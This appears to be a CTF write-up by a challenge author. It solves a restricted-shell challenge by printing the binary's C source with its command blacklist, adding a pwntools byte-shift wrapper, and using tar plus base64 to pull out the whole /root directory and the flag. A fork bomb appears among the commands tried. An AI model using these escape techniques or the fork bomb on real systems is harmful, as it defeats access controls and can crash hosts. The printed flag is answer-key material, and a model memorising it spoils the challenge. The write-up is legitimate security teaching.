# IRS Internal CTF
## The Hacker Experience [misc]

_You've pwned the [server](https://drive.google.com/uc?id=1DslTyGzaoGBEmQv7s3VlstLtwSS4ulSw); now all you need is `flag.txt`_

`irscybersec.tk 13144`

_NOTE: all connections share the same box; if you care about points, you might want take steps to prevent inadvertent solution leaks._

### A/N: You do _misc_?

I don't do `misc` a lot, and T-H-E didn't start out as a restricted-shell challenge. Eventually though, the concept grew on me, and I'd figured that most people would appreciate something that wasn't `pwn` from me.

You can still kind-of see the remnants of what the challenge would've been from the calls to `getenv()`, which --- strictly speaking --- aren't truly necessary for the second flag. But _that's spoilers for flag 2_, so you won't be getting anything more about that here.

Let's move on to the challenge proper.

### Probing

So. We're given a netcat connection that almost looks like a pwntools shell:
```sh
$ nc irscybersec.tk 13144
Congratulations; you've pwned cybersec...
Now, put in your malicious commands:
$ 
```
Inexplicably, none of the commands we put actually give back a response:
```sh
$ ls
$ bash
$ help
$ cat flag.txt
$ cat flag.txt 0>&1 #a previous CTF did this; not that unoriginal
$ touch leonard's dick
$ :(){ :&:;};:
$ >:(
$ ^C
```

If we're going to figure out what's happening, we'll have to look at the binary.

### Going through IDA

IDA works, and I'm lazy. Unlike what the heading suggests, I'm going to dump the entire C code for the binary here for tractability:



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define CMDLEN  64
#define REDCLR  "\033[31;1;4m"
#define NOCOLOR "\033[0m"

void intro(){
    puts("Congratulations; you've pwned cybersec...");
    puts("Now, put in your malicious commands:");
}

_Bool check_blacklist(char *s) {
    const char *blacklist[] = {"FLAG", "env", "set"};
    for (int i = 0; i < sizeof(blacklist)/sizeof(*blacklist); i++)
        if (strstr(s, blacklist[i]))
            return puts("Woah, \033[0;1;4mreal" NOCOLOR " hacking ain't allowed here.");
}

int run_hacker_command(char *s) {
    for (int i = 0; i < CMDLEN; i++) {
        s[i]+=128;
        if (!isalpha(s[i]) && s[i] != '$' && s[i] != '/') s[i] = ' ';
    }
    s[CMDLEN-1] = '\0';
    strcat(s, " < /dev/null");
    if (check_blacklist(s) == 0)
        return system(s);
}

int main(){
    char *flag = getenv("FLAG");
    intro();
    unsigned char s[CMDLEN];
    while (1) {
        printf(REDCLR "$" NOCOLOR " ");
        memset(s, 0, CMDLEN);
        fgets(s, CMDLEN, stdin);
        run_hacker_command(s);
    }
}
```
There are 1+three things that you'll want to pull from this code.
0. `fgets()` is set to take in a safe amount of input.
    Yes, you can _technically_ BOF with `" < /dev/null"`, but that gets you nowhere so stop trying.
1. The input string undergoes this manipulation:
    ```c
    for (int i = 0; i < CMDLEN; i++) {
        s[i]+=128;
        if (!isalpha(s[i]) && s[i] != '$' && s[i] != '/') s[i] = ' ';
    }
    ```
    We'll have to deal with that to submit any working command.
2. `strcat(s, " < /dev/null");`. This effectively means that **any command needing stdin is banned.**
3. `const char *blacklist[] = {"FLAG", "env", "set"};` means that the command sent can't contain any of those substrings. This is notable for flag 2 only, so we'll ignore it for now.

We can get a basic interactive shell working if we just pipe a pwn-wrapper to add 128 to every character:
```python
from pwn import *
r = remote('irscybersec.tk', 13144)
while 1:
    print r.recvuntil('$\033[0m '),
    s = raw_input()
    r.sendline(''.join(chr(ord(c)+128) for c in s))
```
```sh
[+] Opening connection to irscybersec.tk on port 13144: Done
Congratulations; you've pwned cybersec...
Now, put in your malicious commands:
$ ls
 a.out  flag.txt  solution.py  test.c
$ cat flag.txt
$ echo what
what
$ file flag.txt
flag: cannot open `flag' (No such file or directory)
txt:  cannot open `txt' (No such file or directory)
```
You'll notice an important restriction from point (1):

```c
if (!isalpha(s[i]) && s[i] != '$' && s[i] != '/') s[i] = ' ';
```

Any character non-alphabetical (and not "$" or "/") is immediately converted to an empty space. This includes the `.` character, which naturally means you can't `cat` out `flag.txt`.

Most commands are useless. Without the `-` character, you're limited to the default behaviour of a program; no `find -exec`.

Interactive programs are banned; pipes (`|`) are banned, subprocesses (`$(cmd)`) are dead, assignment (`=`) is killed, and although you could _hypothetically_ execute an arbitrary script (`/path/to/script.sh`), you'd need to actually write to the script from somewhere, which is mostly impossible.

So. Almost everything is doomed, what then?

### Crashing POSIX

_Without the `-` character, you're limited to the default behaviour of a program;_

Say hello to special-needs resident, `tar`:
```man
Option styles
       Options to GNU tar can be given in three different styles. In traditional style, the first argument is a cluster of option letters and all subsequent arguments supply arguments to those options that require them. The arguments are read in the same order as the option letters. Any command line words that remain after all options has been processed are treated as non-optional arguments: file or archive member names.
       For example, the c option requires creating the archive, the v option requests the verbose operation, and the f option takes an argument that sets the name of the archive to operate upon. The following command, written in the traditional style, instructs tar to store all files from the directory /etc into the archive file etc.tar verbosely listing the files being archived:
       tar cfv a.tar /etc
```
With options available, we've got a free pick on what we want to do with the filesystem.

The default behaviour of `tar` is to traverse directories recursively. We don't need to archive `flag.txt` in particular; we can just swallow up the whole directory:

```sh
$ tar cf tarfilename /root
$ ls
 a.out  flag.txt  solution.py  tarfilename  test.c
$ tar tf tarfilename
root/
root/.profile
root/.bashrc
root/test.c
root/solution.py
root/a.out
root/flag.txt
root/.dockerignore
root/.wget-hsts 
```
`flag.txt` is embedded in there somewhere. We can _try_ to pipe it out with the O option, but you'll quickly run into output errors because of `/root/a.out`:
```sh
$ tar Oxf tarfilename
 # ~/.profile: executed by Borune-compatible login shells.
...
\x7fELF???\x00\x00\x00\x00\x00\x00\x00...
Error in sys.exitfunc
```
We can convert the tar to a printable form with `base64`:
```sh
$ base64 tarfilename
cm9vdC8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA3MDAAMDAwMDAw
...
```
And then copy-paste it onto your home terminal, extracting the flag there:
```sh
you@home-terminal:~$ base64 -di copied_base64.txt > tarfilename
you@home-terminal:~$ tar Oxf tarfilename root/flag.txt
IRS{y0u_d1d_1t.goodjobiguess!!}
```
And you're done. On to flag 2.

## Flag

`IRS{y0u_d1d_1t.goodjobiguess!!}`

### Reflections

This challenge was _fun_, in part because I didn't know if there was going to be a solution when I finished making it. I figured it out _a_ solution, after a few hours, and there's doubtlessly a dozen different ways you could go about solving T.H.E.

I don't think there's an easier method than this, but if you've got one, I'd be glad to hear it.
